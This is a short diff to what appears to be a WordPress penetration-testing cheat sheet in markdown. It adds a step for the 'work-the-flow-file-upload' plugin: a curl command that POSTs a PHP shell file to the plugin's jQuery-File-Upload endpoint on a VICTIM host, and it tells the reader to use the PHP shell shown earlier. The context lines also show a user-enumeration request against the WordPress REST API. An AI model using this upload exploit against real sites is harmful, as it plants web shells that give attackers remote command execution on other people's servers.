@@ -122,6 +122,10 @@ echo "<pre>$output</pre>";
 
   - __`curl -s -I -X GET https://wordpress.com/wp-json/wp/v2/users`__
 
+- __For the `flow file upload` plugin__
+  - > __use the above php shell script__
+  - __`curl -k -X POST -F "action=upload" -F "files=@./shell.php" http://VICTIM/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php`__
+
 
 
 - [ ] __1. WP VERSION__
